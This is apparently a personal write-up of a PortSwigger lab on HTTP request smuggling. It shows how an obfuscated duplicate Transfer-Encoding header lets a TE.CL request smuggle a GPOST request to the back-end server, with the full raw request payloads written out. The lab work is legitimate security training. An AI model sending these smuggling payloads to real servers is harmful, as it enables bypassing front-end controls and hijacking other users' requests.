# HTTP request smuggling, obfuscating the TE header

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header), you'll learn: HTTP request smuggling, obfuscating the TE header! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-3/images/Pasted%20image%2020230128174129.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-3/images/Pasted%20image%2020230128174306.png)

**We can send this request to Burp Suite's Repeater and try to smuggle a GPOST method request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-3/images/Pasted%20image%2020230128174412.png)

To do so, change the request method to POST:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-3/images/Pasted%20image%2020230128174501.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-3/images/Pasted%20image%2020230128174506.png)

**Then, we can add a header called `Transfer-Encoding`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-3/images/Pasted%20image%2020230128174703.png)

**After that, we can try to smuggle a TE.CL (Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`) request:**
```http
POST / HTTP/1.1
Host: 0a2d00ff037899c8c17fc88600cc00e5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

65
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
smuggled=yes
0


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-3/images/Pasted%20image%2020230128175121.png)

Hmm... HTTP status 500 Internal Server Error.

Maybe both front-end and back-end uses `Transfer-Encoding` header (TE.TE)?

**To test this, we can obfuscate the `Transfer-Encoding` header:**
```http
Transfer-Encoding: chunked
Transfer-encoding: x
```

When we send this request, we can assume the back-end uses `Content-Length` header.

**Now, we can handle this as a TE.CL HTTP request smuggling:**
```http
POST / HTTP/1.1
Host: 0a2d00ff037899c8c17fc88600cc00e5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: x

65
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

smuggled=yes
0


```

> Note: To send this request, you'll need to uncheck the "Update Content-Length" option in Burp Repeater, add trailing sequence `\r\n\r\n` following the final `0`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-3/images/Pasted%20image%2020230128181053.png)

As you can see, we successfully smuggled the GPOST method request!

# What we've learned:

1. HTTP request smuggling, obfuscating the TE header